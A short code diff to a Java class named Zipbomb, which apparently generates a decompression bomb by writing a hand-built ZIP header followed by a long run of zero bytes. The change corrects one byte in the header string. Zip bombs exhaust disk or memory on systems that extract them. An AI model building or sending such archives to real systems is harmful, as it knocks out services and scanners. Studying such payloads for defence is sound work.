@@ -53,7 +53,7 @@ public class Zipbomb {
 		} while ((F >>= 1) > 0);
 		long I = ~f(D, A) & A;
 		String V = Y(I) + Y(size + 14) + Y(size * 1032 + 1);
-		output.write(("PK\u0003\u0004\u0014\0\0\0\u0008\0\0\0\0\0" + V + "\u0001\0\0\u00000\u00ed\u00c0").getBytes(), 0, 33);
+		output.write(("PK\u0003\u0004\u0014\0\0\0\u0008\0\0\0\0\0" + V + "\u0001\0\0\0\0\u00ed\u00c0").getBytes(), 0, 33);
 		output.write(0x81);
 		output.write("\u0008\0\0\0\u00c0\u00b0\u00fbS_d\u000b".getBytes(), 0, 11);
 		for (i = size; i --> 1;) output.write(0);
